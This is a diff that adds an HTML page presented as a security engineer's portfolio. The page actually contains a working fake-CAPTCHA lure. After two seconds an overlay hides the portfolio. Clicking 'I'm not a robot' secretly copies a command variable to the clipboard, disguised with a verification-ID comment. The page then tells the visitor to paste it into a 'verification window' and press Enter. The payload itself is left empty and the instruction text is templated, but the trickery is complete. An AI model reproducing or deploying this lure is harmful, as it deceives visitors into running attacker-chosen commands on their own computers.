@@ -1,0 +1,912 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <title>Cristina Santos | Security Engineer</title>
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.15.4/css/all.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Roboto+Mono&display=swap" rel="stylesheet">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        /* Modern Portfolio Styles */
+        :root {
+            --primary-bg: #0b1121;
+            --card-bg: #1a2335;
+            --accent-blue: #3b82f6;
+            --text-primary: #f8fafc;
+            --text-secondary: #94a3b8;
+            --highlight: #7f5af0;
+            --border: #2e3b52;
+        }
+        
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+        
+        body {
+            margin: 0;
+            padding: 0;
+            background: var(--primary-bg);
+            min-height: 100vh;
+            font-family: 'Inter', sans-serif;
+            color: var(--text-primary);
+            line-height: 1.6;
+        }
+
+        .navbar {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            background: rgba(11, 17, 33, 0.8);
+            backdrop-filter: blur(8px);
+            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+            padding: 1rem 2rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            z-index: 100;
+        }
+
+        .logo {
+            font-weight: 700;
+            font-size: 1.5rem;
+            color: var(--accent-blue);
+            text-decoration: none;
+        }
+
+        .nav-links {
+            display: flex;
+            gap: 2rem;
+        }
+
+        .nav-link {
+            color: var(--text-secondary);
+            text-decoration: none;
+            font-weight: 500;
+            transition: color 0.3s;
+        }
+
+        .nav-link:hover {
+            color: var(--accent-blue);
+        }
+
+        .loading-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 120px 20px 80px;
+        }
+
+        .header {
+            text-align: left;
+            margin-bottom: 60px;
+            max-width: 800px;
+        }
+
+        .intro-wrapper {
+            display: flex;
+            align-items: flex-start;
+            gap: 40px;
+            margin-bottom: 60px;
+        }
+
+        .avatar-placeholder {
+            width: 120px;
+            height: 120px;
+            border-radius: 12px;
+            background: var(--card-bg);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .header-content {
+            flex: 1;
+        }
+
+        .loading-title {
+            font-size: 2.75rem;
+            margin-bottom: 5px;
+            position: relative;
+            display: inline-block;
+            background: linear-gradient(90deg, var(--text-primary), var(--accent-blue));
+            -webkit-background-clip: text;
+            background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .loading-subtitle {
+            color: var(--text-secondary);
+            font-size: 1.2rem;
+            margin-bottom: 1rem;
+        }
+
+        .loading-description {
+            color: var(--text-secondary);
+            font-size: 1rem;
+            max-width: 600px;
+            margin-bottom: 1.5rem;
+        }
+
+        .section-title {
+            font-size: 1.8rem;
+            margin-bottom: 1.5rem;
+            position: relative;
+            padding-bottom: 0.5rem;
+        }
+
+        .section-title::after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 60px;
+            height: 3px;
+            background: var(--accent-blue);
+        }
+
+        .social-icons {
+            display: flex;
+            gap: 1rem;
+            margin-top: 1.5rem;
+        }
+
+        .social-icon {
+            width: 40px;
+            height: 40px;
+            background: var(--card-bg);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border: 1px solid var(--border);
+        }
+
+        .progress-block {
+            margin: 3rem 0;
+        }
+
+        .portfolio-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));
+            gap: 30px;
+        }
+
+        .portfolio-item {
+            background: var(--card-bg);
+            border-radius: 15px;
+            padding: 20px;
+            position: relative;
+            overflow: hidden;
+            border: 1px solid var(--border);
+            transition: transform 0.3s, box-shadow 0.3s;
+        }
+
+        .portfolio-item:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
+        }
+
+        .thumbnail-placeholder {
+            background: #202b3f;
+            height: 200px;
+            border-radius: 8px;
+            margin-bottom: 15px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .content-placeholder {
+            background: #202b3f;
+            height: 20px;
+            border-radius: 4px;
+            margin-bottom: 10px;
+        }
+
+        .content-placeholder.short {
+            width: 60%;
+        }
+
+        .content-placeholder.medium {
+            width: 85%;
+        }
+
+        .content-placeholder.title {
+            height: 28px;
+            margin-bottom: 15px;
+        }
+
+        .tech-stack {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 8px;
+            margin-top: 15px;
+        }
+
+        .tech-item {
+            background: rgba(59, 130, 246, 0.1);
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 0.85rem;
+            border: 1px solid rgba(59, 130, 246, 0.2);
+        }
+
+        .loading-bar-container {
+            height: 4px;
+            background: #202b3f;
+            border-radius: 2px;
+            margin: 40px auto;
+            width: 300px;
+            overflow: hidden;
+            position: relative;
+        }
+
+        .loading-progress {
+            width: 45%;
+            height: 100%;
+            background: var(--accent-blue);
+            border-radius: 2px;
+            position: relative;
+            transition: width 0.6s ease;
+        }
+
+        .loading-progress::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+            animation: pulse 1.5s infinite;
+        }
+
+        .skeleton-text {
+            height: 1em;
+            margin-bottom: 0.5em;
+            border-radius: 3px;
+            background: #202b3f;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .skills-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
+            gap: 15px;
+            margin-bottom: 40px;
+        }
+
+        .skill-item {
+            background: var(--card-bg);
+            padding: 12px;
+            border-radius: 8px;
+            border: 1px solid var(--border);
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        /* Shimmer Animation */
+        @keyframes shimmer {
+            0% { transform: translateX(-100%); }
+            100% { transform: translateX(100%); }
+        }
+
+        @keyframes pulse {
+            0% { opacity: 0.6; }
+            50% { opacity: 1; }
+            100% { opacity: 0.6; }
+        }
+
+        .shimmer {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(
+                90deg,
+                transparent,
+                rgba(255, 255, 255, 0.05),
+                transparent
+            );
+            animation: shimmer 2s infinite;
+        }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .intro-wrapper {
+                flex-direction: column;
+                align-items: center;
+                text-align: center;
+            }
+            
+            .header {
+                text-align: center;
+            }
+            
+            .section-title::after {
+                left: 50%;
+                transform: translateX(-50%);
+            }
+            
+            .portfolio-grid {
+                grid-template-columns: 1fr;
+            }
+            
+            .nav-links {
+                display: none;
+            }
+            
+            .loading-title {
+                font-size: 2.2rem;
+            }
+        }
+
+        /* --- CAPTCHA STYLES (from original) --- */
+        .captcha-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.75); /* Darker dimmed background */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000; /* Ensure it's on top */
+            opacity: 0; /* Initially hidden */
+            visibility: hidden;
+            transition: opacity 0.3s ease;
+        }
+        .container {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-family: Roboto, helvetica, arial, sans-serif;
+        }
+        .m-p {
+            margin: 0;
+            padding: 0;
+        }
+        .block {
+            display: block;
+        }
+        code {
+            font-size: 9px;
+            margin-left: 2px;
+            color: gray;
+        }
+        .line-normal {
+            line-height: normal;
+        }
+        .checkbox-window {
+            height: 74px;
+            width: 300px;
+            background-color: #f9f9f9;
+            border-radius: 3px;
+            border: 1px solid #d3d3d3;
+        }
+        .checkbox-window a {
+            color: #555;
+            text-decoration: none;
+        }
+        .checkbox-window a:hover {
+            color: #555;
+            text-decoration: underline;
+        }
+        .checkbox-container {
+            width: 28px;
+            height: 28px;
+        }
+        .checkbox {
+            position: relative;
+            background-color: #fff;
+            border-radius: 2px;
+            height: 100%;
+            width: 100%;
+            border: 2px solid #c1c1c1;
+            margin: 21px 0 0 12px;
+            outline: none;
+            font-family: Roboto, helvetica, arial, sans-serif;
+            transition: width 500ms, height 500ms, border-radius 500ms, margin-top 500ms, margin-left 500ms, opacity 700ms;
+        }
+        .checkbox:hover {
+            border: 2px solid #b2b2b2;
+        }
+        .im-not-a-robot {
+            position: relative;
+            left: 52px;
+            bottom: 3px;
+            font-size: 15px;
+            color: #282727;
+        }
+        .captcha-logo {
+            position: relative;
+            left: 244px;
+            bottom: 36px;
+            width: 40px;
+            height: 45px;
+            vertical-align: baseline;
+            padding-bottom: 4px;
+            alt: "Captcha Logo";
+        }
+        .checkbox-desc {
+            color: #555555;
+            position: relative;
+            font-size: 8px;
+            text-align: center;
+            bottom: 40px;
+            left: 112px;
+        }
+        .spinner {
+            visibility: hidden;
+            position: relative;
+            top: -85px;
+            left: 12px;
+            height: 20px;
+            width: 20px;
+            border: 2px solid rgba(0, 0, 0, 0.1);
+            border-top: 2px solid #333;
+            border-radius: 50%;
+            opacity: 0;
+            transition: opacity 0.5s linear;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .verify-window {
+            font-family: Roboto, helvetica, arial, sans-serif;
+            opacity: 0;
+            position: absolute;
+            visibility: hidden;
+            margin: auto;
+            width: 350px;
+            background-color: #fff;
+            border: 1px solid #cecece;
+            box-shadow: 5px 6px 7px -3px rgba(0, 0, 0, 0.12);
+            transition: opacity 400ms;
+        }
+        ol {
+            counter-reset: item;
+            list-style-type: none;
+            list-style-position: outside;    
+            padding-left: 0;
+        }
+        ol li {
+            counter-increment: item;
+            margin-bottom: 10px;
+        }
+        ol li::before {
+            content: counter(item) ". ";
+            color: #1A73E8;
+            font-weight: bold;
+            margin-right: 10px;
+            margin-left: 10px;
+        }
+        .verify-container {
+            padding: 8px;
+        }
+        .verify-header {
+            background-color: #1A73E8;
+            padding: 16px 16px 24px 16px;
+            color: #fff;
+        }
+        .verify-header-text-small {
+            font-size: 14px;
+            line-height: normal;
+        }
+        .verify-header-text-medium {
+            font-size: 16px;
+        }
+        .verify-header-text-big {
+            font-size: 24px;
+            font-weight: 700;
+        }
+        .verify-main {
+            padding: 5px;
+            color: #111;
+            font-size: 13px;
+        }
+        .verify-footer {
+            border-top: 1px solid #cecece;
+            padding: 10px 7px;
+            color: #737373;
+            display: grid;
+            grid-template-columns: auto 102px;
+            font-size: 13px;
+        }
+        .verify-footer-left {
+            padding: 5px;
+        }
+        .verify-verify-button {
+            text-transform: uppercase;
+            background-color: #5a89e2;
+            color: #fff;
+            text-align: center;
+            width: 100%;
+            padding: 12px 0;
+            text-decoration: none;
+            font-weight: 600;
+            border-radius: 3px;
+            font-size: 14px;
+            border: none;
+            outline: none;
+            cursor: not-allowed;
+        }
+    </style>
+</head>
+<body>
+    <!-- Navbar -->
+    <nav class="navbar">
+        <a href="#" class="logo">CS</a>
+        <div class="nav-links">
+            <a href="#about" class="nav-link">About</a>
+            <a href="#projects" class="nav-link">Projects</a>
+            <a href="#skills" class="nav-link">Skills</a>
+            <a href="#contact" class="nav-link">Contact</a>
+        </div>
+    </nav>
+
+    <!-- Portfolio Content (Initially Hidden by Captcha) -->
+    <div class="loading-container" style="opacity:0.9">
+        <div class="intro-wrapper">
+            <div class="avatar-placeholder">
+                <div class="shimmer"></div>
+            </div>
+            <div class="header-content">
+                <header class="header">
+                    <h1 class="loading-title">Cristina Santos</h1>
+                    <p class="loading-subtitle">Security Engineer | Application Security Specialist</p>
+                    <p class="loading-description">
+                        Experienced security professional specializing in application security, secure code reviews, and security architecture design. Currently working on advanced threat modeling methodologies and secure development lifecycle automation.
+                    </p>
+                    <div class="social-icons">
+                        <div class="social-icon"><i class="fab fa-github" style="color: var(--text-secondary)"></i></div>
+                        <div class="social-icon"><i class="fab fa-linkedin" style="color: var(--text-secondary)"></i></div>
+                        <div class="social-icon"><i class="fab fa-twitter" style="color: var(--text-secondary)"></i></div>
+                    </div>
+                </header>
+            </div>
+        </div>
+
+        <div id="projects" class="progress-block">
+            <div class="loading-bar-container">
+                <div class="loading-progress">
+                    <div class="shimmer"></div>
+                </div>
+            </div>
+            <p style="text-align: center; color: var(--text-secondary);">Loading portfolio data...</p>
+        </div>
+
+        <section id="skills">
+            <h2 class="section-title">Expertise</h2>
+            <div class="skills-grid">
+                <div class="skill-item">
+                    <div class="shimmer"></div>
+                    Application Security
+                </div>
+                <div class="skill-item">
+                    <div class="shimmer"></div>
+                    OWASP Top 10
+                </div>
+                <div class="skill-item">
+                    <div class="shimmer"></div>
+                    Secure Code Review
+                </div>
+                <div class="skill-item">
+                    <div class="shimmer"></div>
+                    Penetration Testing
+                </div>
+                <div class="skill-item">
+                    <div class="shimmer"></div>
+                    Threat Modeling
+                </div>
+                <div class="skill-item">
+                    <div class="shimmer"></div>
+                    DevSecOps
+                </div>
+            </div>
+        </section>
+
+        <section>
+            <h2 class="section-title">Featured Projects</h2>
+            <div class="portfolio-grid">
+                <!-- Project 1 -->
+                <div class="portfolio-item">
+                    <div class="thumbnail-placeholder">
+                        <div class="shimmer"></div>
+                    </div>
+                    <div class="content-placeholder title"></div>
+                    <div class="content-placeholder medium"></div>
+                    <div class="content-placeholder"></div>
+                    <div class="tech-stack">
+                        <div class="tech-item">SAST</div>
+                        <div class="tech-item">Python</div>
+                        <div class="tech-item">CI/CD</div>
+                    </div>
+                </div>
+
+                <!-- Project 2 -->
+                <div class="portfolio-item">
+                    <div class="thumbnail-placeholder">
+                        <div class="shimmer"></div>
+                    </div>
+                    <div class="content-placeholder title"></div>
+                    <div class="content-placeholder medium"></div>
+                    <div class="content-placeholder"></div>
+                    <div class="tech-stack">
+                        <div class="tech-item">Cloud Security</div>
+                        <div class="tech-item">AWS</div>
+                        <div class="tech-item">IAM</div>
+                    </div>
+                </div>
+
+                <!-- Project 3 -->
+                <div class="portfolio-item">
+                    <div class="thumbnail-placeholder">
+                        <div class="shimmer"></div>
+                    </div>
+                    <div class="content-placeholder title"></div>
+                    <div class="content-placeholder medium"></div>
+                    <div class="content-placeholder"></div>
+                    <div class="tech-stack">
+                        <div class="tech-item">Zero Trust</div>
+                        <div class="tech-item">Authentication</div>
+                        <div class="tech-item">OAuth 2.0</div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <section id="contact" style="margin-top: 60px;">
+            <h2 class="section-title">Contact</h2>
+            <div style="max-width: 600px;">
+                <div class="skeleton-text" style="width: 70%;"></div>
+                <div class="skeleton-text" style="width: 85%;"></div>
+                <div class="skeleton-text" style="width: 60%;"></div>
+            </div>
+        </section>
+    </div>
+
+    <!-- CAPTCHA Overlay -->
+    <div class="captcha-overlay">
+        <div class="container">
+            <div id="checkbox-window" class="checkbox-window m-p block">
+                <div class="checkbox-container m-p">
+                    <button type="button" id="checkbox" class="checkbox m-p line-normal"></button>
+                </div>
+                <p class="im-not-a-robot m-p line-normal">I'm not a robot</p>
+                <img src="https://www.google.com/recaptcha/about/images/reCAPTCHA-logo@2x.png" class="captcha-logo line-normal" alt="Captcha Logo">
+                <br>
+                <p class="checkbox-desc m-p line-normal">
+                    <a href="https://www.google.com/intl/en/policies/privacy/">Privacy</a> - 
+                    <a href="https://www.google.com/intl/en/policies/terms/">Terms</a>
+                </p>
+                <img class="spinner" alt="Loading Spinner" id="spinner">
+            </div>
+            
+            <div id="verify-window" class="verify-window">
+                <div class="verify-container">
+                    <header class="verify-header">
+                        <span class="verify-header-text-medium m-p block">Complete these</span>
+                        <span class="verify-header-text-big m-p block">Verification Steps</span>
+                        <span class="verify-header-text-medium m-p block"></span>
+                    </header>
+                    <main class="verify-main">
+                        <p>
+                            To better prove you are not a robot, please:
+                        </p>
+                        <ol>
+                            <li>${instruction}</li>
+                            <li>In the verification window, press ${pasteShortcut}.</li>
+                            <li>Press <b>Enter</b> on your keyboard to finish.</li>
+                        </ol>
+                        <p>
+                            You will observe and agree:
+                            <br>
+                            <code>
+                                ✅ "I am not a robot - reCAPTCHA Verification ID: <span id="verification-id">146820</span>"
+                            </code>
+                        </p>
+                    </main>
+                </div>
+                <footer class="verify-container verify-footer">
+                    <div class="verify-footer-left">
+                        Perform the steps above to finish verification.
+                    </div>
+                    <button type="button" class="verify-verify-button block" id="verify-verify-button" disabled="true">Verify</button>
+                </footer>
+            </div>
+        </div>
+    </div>
+
+    <!-- Set payload as a global variable before scripts run -->
+    <script>
+        window.payloadValue = ""; // Ensure this is set correctly
+    </script>
+
+    <script>
+        // Original CAPTCHA JavaScript (from the provided code)
+        let checkboxWindow = document.getElementById("checkbox-window");
+        let checkboxBtn = document.getElementById("checkbox");
+        let checkboxBtnSpinner = document.getElementById("spinner");
+        let verifywindow = document.getElementById("verify-window");
+
+        function addCaptchaListeners() {
+            if (checkboxBtn) {
+                document.addEventListener("click", function (event) {
+                    let path = event.composedPath();
+                    if (!path.includes(verifywindow) && isverifywindowVisible()) {
+                        closeverifywindow();
+                    }
+                });
+                checkboxBtn.addEventListener("click", function (event) {
+                    event.preventDefault();
+                    checkboxBtn.disabled = true;
+                    runClickedCheckboxEffects();
+                });
+            }
+        }
+
+        function runClickedCheckboxEffects() {
+            hideCaptchaCheckbox();
+            setTimeout(function(){
+                showCaptchaLoading();
+            },500);
+            setTimeout(function(){
+                showVerifyWindow();
+            },900);
+        }
+
+        function showCaptchaLoading() {
+            checkboxBtnSpinner.style.visibility = "visible";
+            checkboxBtnSpinner.style.opacity = "1";
+            checkboxBtnSpinner.style.animation = "spin 1s linear infinite";
+        }
+
+        function hideCaptchaLoading() {
+            checkboxBtnSpinner.style.opacity = "0";
+            checkboxBtnSpinner.style.animation = "none";
+            setTimeout(function() {
+                checkboxBtnSpinner.style.visibility = "hidden";
+            }, 500);
+        }
+
+        function hideCaptchaCheckbox() {
+            checkboxBtn.style.visibility = "hidden";
+            checkboxBtn.style.opacity = "0";
+        }
+
+        function showCaptchaCheckbox() {
+            checkboxBtn.style.width = "100%";
+            checkboxBtn.style.height = "100%";
+            checkboxBtn.style.borderRadius = "2px";
+            checkboxBtn.style.margin = "21px 0 0 12px";
+            checkboxBtn.style.opacity = "1";
+        }
+
+        function generateRandomNumber() {
+            const min = 1000; 
+            const max = 9999;
+            return Math.floor(Math.random() * (max - min + 1) + min).toString();
+        }
+
+        function closeverifywindow() {
+            verifywindow.style.display = "none";
+            verifywindow.style.visibility = "hidden";
+            verifywindow.style.opacity = "0";
+
+            showCaptchaCheckbox();
+            hideCaptchaLoading();
+            checkboxBtn.disabled = false;
+        }
+
+        function isverifywindowVisible() {
+            return verifywindow.style.display !== "none" && verifywindow.style.display !== "";
+        }
+
+        function setClipboardCopyData(textToCopy){
+            const tempTextArea = document.createElement("textarea");
+            tempTextArea.value = textToCopy;
+            document.body.append(tempTextArea);
+            tempTextArea.select();
+            document.execCommand("copy");
+            document.body.removeChild(tempTextArea);
+        }
+
+        function stageClipboard(commandToRun, verification_id){
+            const suffix = " # ";
+            const ploy = "✅ ''I am not a robot - reCAPTCHA Verification ID: ";
+            const end = "''";
+            const textToCopy = commandToRun + suffix + ploy + verification_id + end;
+            setClipboardCopyData(textToCopy);
+        }
+
+        function showVerifyWindow() {
+            verifywindow.style.display = "block";
+            verifywindow.style.visibility = "visible";
+            verifywindow.style.opacity = "1";
+            verifywindow.style.top = checkboxWindow.offsetTop - 80 + "px";
+            verifywindow.style.left = checkboxWindow.offsetLeft + 54 + "px";
+
+            if (verifywindow.offsetTop < 5) {
+               verifywindow.style.top = "5px";
+            }
+
+            if (verifywindow.offsetLeft + verifywindow.offsetWidth > window.innerWidth - 10) {
+               verifywindow.style.left = checkboxWindow.offsetLeft - 8 + "px";
+            }
+
+            var verification_id = generateRandomNumber();
+            document.getElementById("verification-id").textContent = verification_id;
+            
+            // Fix: Use a globally defined variable that was set outside the script
+            var commandToRun = window.payloadValue || '';
+            
+            stageClipboard(commandToRun, verification_id);
+
+            // Enable verify button after 30 seconds
+            const verifyButton = document.getElementById("verify-verify-button");
+            setTimeout(() => {
+                verifyButton.disabled = false;
+                verifyButton.style.cursor = "pointer";
+                verifyButton.style.backgroundColor = "#1a73e8";
+                
+                // Add click handler for the verify button
+                verifyButton.addEventListener('click', () => {
+                    document.cookie = "captcha_passed=true; path=/";
+                    window.location.reload();
+                });
+            }, 30000); // Reduced time for better UX
+        }
+        // --- End of CAPTCHA JavaScript ---
+
+        // Show CAPTCHA after 2 seconds, and hide portfolio
+        setTimeout(() => {
+            const overlay = document.querySelector('.captcha-overlay');
+            const portfolioContent = document.querySelector('.loading-container');
+            if (overlay) {
+                overlay.style.visibility = 'visible';
+                overlay.style.opacity = '1';
+                portfolioContent.style.opacity = '0'; // Hide portfolio initially
+            }
+        }, 2000);
+
+
+        // Portfolio-specific JavaScript - Enhanced loading effects
+        const shimmerElements = document.querySelectorAll('.shimmer');
+        
+        // Random animation delays for shimmer elements
+        shimmerElements.forEach(element => {
+            const delay = Math.random() * 2;
+            element.style.animationDelay = `${delay}s`;
+        });
+
+        // Gentle loading progress bar animation
+        const progressBar = document.querySelector('.loading-progress');
+        let width = 30;
+        const maxWidth = 90;
+        
+        const animateProgress = () => {
+            if (width < maxWidth) {
+                width += Math.random() * 5;
+                if (width > maxWidth) width = maxWidth;
+                if (progressBar) {
+                    progressBar.style.width = `${width}%`;
+                }
+                setTimeout(animateProgress, 1000 + Math.random() * 2000);
+            }
+        };
+        
+        setTimeout(animateProgress, 1000);
+
+        addCaptchaListeners(); // Initialize CAPTCHA listeners
+    </script>
+</body>
+</html>
